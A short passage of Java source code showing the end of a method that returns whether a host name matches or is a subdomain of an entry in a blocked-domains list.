        if (host == null || host.isEmpty()) return false;
        String hostLower = host.toLowerCase();
        return BLOCKED_DOMAINS.stream().anyMatch(blocked -> hostLower.equals(blocked) || hostLower.endsWith("." + blocked));
    }
}
